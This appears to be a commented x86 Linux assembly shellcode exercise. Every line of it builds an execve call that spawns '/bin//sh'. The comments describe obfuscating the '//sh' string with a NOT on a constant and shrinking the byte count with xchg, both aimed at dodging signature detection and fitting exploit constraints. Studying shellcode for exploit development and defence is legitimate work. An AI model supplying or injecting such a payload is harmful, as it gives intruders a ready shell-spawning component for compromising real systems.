global _start

section .text

_start:
 
 xor eax, eax		;zero out eax register
 push eax		; push 0 on to stack
 
; objective is to push 0x68732f2f--- > (hs//)  on to stack. 
mov ecx, 0x978CD0D0 		; move  0x978CD0D0 to ecx register
 not ecx    			;not (0x978CD0D0) = 0x68732f2f
 push ecx			;push 0x68732f2f onto stack  -- hs//
 push 0x6e69622f		; push  nib/ onto stack 
 xor ecx, ecx			; zero out ecx register
 xchg esp, ebx			; objective is to place esp pointer to arg  in ebx reg.. instead of using mov ebx, esp ,use xchg to reduce the byte of shellcode 
 mov al, 0xb			; execve sys call number
 int 0x80
